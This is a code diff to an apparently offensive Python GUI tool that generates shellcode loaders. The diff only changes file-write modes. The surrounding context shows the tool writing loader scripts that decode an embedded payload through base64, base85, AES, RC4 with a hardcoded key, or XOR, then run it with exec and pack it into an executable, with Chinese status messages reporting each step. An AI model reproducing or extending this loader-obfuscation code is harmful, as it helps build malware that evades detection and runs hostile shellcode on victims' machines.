@@ -41,7 +41,7 @@ class ControlBoard(QMainWindow, Ui_widget):
         time.sleep(0.5)
         Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
         time.sleep(0.5)
-        with open("result/exe/1.json", "w") as outfile:
+        with open("result/exe/1.json", "w+") as outfile:
             json.dump(dictionary, outfile)
         Ui_widget.printf(self, '[+] 1.json写入成功')
         time.sleep(0.5)
@@ -58,7 +58,7 @@ code = base64.b64decode(code)
 code = bytes.fromhex(str(code,'utf-8'))
 exec (base64.b64decode(load))
 """
-        with open("result/ma.py", 'a+') as f:
+        with open("result/ma.py", 'w+') as f:
             f.write(command_base64)
             f.close()
         Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
@@ -89,7 +89,7 @@ exec (base64.b64decode(load))
         time.sleep(0.5)
         Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
         time.sleep(0.5)
-        with open("result/exe/1.json", "w") as outfile:
+        with open("result/exe/1.json", "w+") as outfile:
             json.dump(dictionary, outfile)
         Ui_widget.printf(self, '[+] 1.json写入成功')
         time.sleep(0.5)
@@ -108,7 +108,7 @@ code = bytes.fromhex(code)
 load = aesdecypto.decrypt(aes_key, load)
 exec (load)
 """.encode('utf-8').decode()
-        with open("result/ma.py", 'a+') as f:
+        with open("result/ma.py", 'w+') as f:
             f.write(command_aes)
             f.close()
         Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
@@ -139,7 +139,7 @@ exec (load)
         time.sleep(0.5)
         Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
         time.sleep(0.5)
-        with open("result/exe/1.json", "w") as outfile:
+        with open("result/exe/1.json", "w+") as outfile:
             json.dump(dictionary, outfile)
         Ui_widget.printf(self, '[+] 1.json写入成功')
         time.sleep(0.5)
@@ -157,7 +157,7 @@ code = bytes.fromhex(code)
 load = rc4decrypt.rc4_main("hdfhaagaj7739skjshs", load)
 exec (load)
 """
-        with open("result/ma.py", 'a+') as f:
+        with open("result/ma.py", 'w+') as f:
             f.write(command_rc4)
             f.close()
         Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
@@ -188,7 +188,7 @@ exec (load)
         time.sleep(0.5)
         Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
         time.sleep(0.5)
-        with open("result/exe/1.json", "w") as outfile:
+        with open("result/exe/1.json", "w+") as outfile:
             json.dump(dictionary, outfile)
         Ui_widget.printf(self, '[+] 1.json写入成功')
         time.sleep(0.5)
@@ -206,7 +206,7 @@ code = base64.b85decode(code)
 code = bytes.fromhex(str(code,'utf-8'))
 exec (base64.b85decode(load))
 """
-        with open("result/ma.py", 'a+') as f:
+        with open("result/ma.py", 'w+') as f:
             f.write(command_base64)
             f.close()
         Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
@@ -237,7 +237,7 @@ exec (base64.b85decode(load))
         time.sleep(0.5)
         Ui_widget.printf(self, '[+] shellcode加载器加密成功!')
         time.sleep(0.5)
-        with open("result/exe/1.json", "w") as outfile:
+        with open("result/exe/1.json", "w+") as outfile:
             json.dump(dictionary, outfile)
         Ui_widget.printf(self, '[+] 1.json写入成功')
         time.sleep(0.5)
@@ -255,7 +255,7 @@ code = DoXor.XorDecode(code,"aaaaaaaaaa")
 code = bytes.fromhex(code)
 exec (DoXor.XorDecode(load,"aaaaaaaaaa"))
 """
-        with open("result/ma.py", 'w') as f:
+        with open("result/ma.py", 'w+') as f:
             f.write(command_Xor)
             f.close()
         Ui_widget.printf(self, '[+] ma.py写入成功,打包exe中,请稍等......')
